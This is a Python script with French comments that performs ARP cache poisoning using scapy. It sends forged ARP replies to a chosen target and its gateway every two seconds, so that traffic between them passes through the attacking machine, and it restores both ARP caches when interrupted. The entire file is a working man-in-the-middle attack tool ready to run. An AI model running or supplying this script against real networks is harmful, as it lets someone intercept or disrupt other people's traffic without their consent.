#!/usr/bin/python3
#coding:utf-8


# Import des modules
import argparse
import socket
import time
import sys

from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.sendrecv import send, sr1

# Définition des arguments pour l'exécution du script comme une commande
parser = argparse.ArgumentParser(description="ARP Cache Poisoning Script")
parser.add_argument("--gateway", "-g", help="Gateway IP", required=True)
parser.add_argument("--target", "-t", help="Target IP", required=True)

# Analyse les arguments de la ligne de commande réçu et stocke les valeurs dans l'objet args
args = parser.parse_args()

# Obtention de l'IP de la machine attaquante
hostname = socket.gethostname()
host_ip = socket.gethostbyname(hostname)

# La fonction get_mac est une fonction qui permet d'obtenir l'adresse MAC d'une machine à partir de l'adresse IP qu'on lui fourni
def get_mac(ip):
    arp_packet = ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip, pdst=ip)
    arp_response = sr1(arp_packet, verbose=0)
    return arp_response.hwsrc

# Cette fonction restore toutes les modification apporté dans le cache ARP de la cible lors de l'attaque
def restore_arpcache(targetIP, targetMAC, sourceIP, sourceMAC):
	restorecache_packet= ARP(op=2 , hwsrc=sourceMAC , psrc=sourceIP, hwdst=targetMAC , pdst=targetIP)
	send(restorecache_packet, verbose=False)
	print("La table ARP de la cible {} a ete restaure avec succes !".format(targetIP))

# La fonction poison permet d'empoisonner le cache ARP de la passerelle et celle de la victime
def spoof_arpcache(gatewayIP, gatewayMAC, targetIP, targetMAC):
    
    # Formulation d'un packet Gratuitous ARP à destination de la machine cible.
    # Ceci afin que la victime associe l'adresse MAC de la machine attaquante à l'adresse IP de la passerelle
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gatewayIP
    poison_target.pdst = targetIP
    poison_target.hwdst = targetMAC
    
    # Formulation d'un packet Gratuitous ARP à destination de la passerelle.
    # Ceci afin que la passerelle associe l'adresse MAC de la machine attaquante à l'adresse IP de la victime
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = targetIP
    poison_gateway.pdst = gatewayIP
    poison_gateway.hwdst = gatewayMAC

    
    try:
        
        print("[*] Debut de l'attaque ARP Cache Poinsonning... [CTRL-C pour quitter]")
        print("[Gateway] : IP=({}), MAC=({})".format(gatewayIP,gatewayMAC))
        print("[Target] : IP=({}), MAC=({})".format(targetIP,targetMAC))
        # Envoie des packets formulés indéfiniment chaque 2 secondes aux deux cibles : la passerelle et la machine victime
        while True:
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            # On affiche le caractère (*) pour montrer que l'attaque est en cours
            print("*", end="")
            # Force le vidage du tampon de sortie
            sys.stdout.flush()
            # Met une pause de 2 secondes avant de renvoyer encore les packets
            time.sleep(2)
    except KeyboardInterrupt:
        # Si l'exception KeyboardInterrupt a ete detecter, cela veux dire que l'utilisateur du script a force l'arret du processus.
        print("\n[*] Fin de l'attaque ARP Cache Poinsonning...")
        # On restore le cache ARP des deux cibles avant de quitter.
        restore_arpcache(gatewayIP, gatewayMAC, targetIP, targetMAC)
        restore_arpcache(targetIP, targetMAC, gatewayIP, gatewayMAC)
        quit()

if __name__ == "__main__":
    # Exécutionn de l'attaque
    spoof_arpcache(args.gateway, get_mac(args.gateway), args.target, get_mac(args.target))
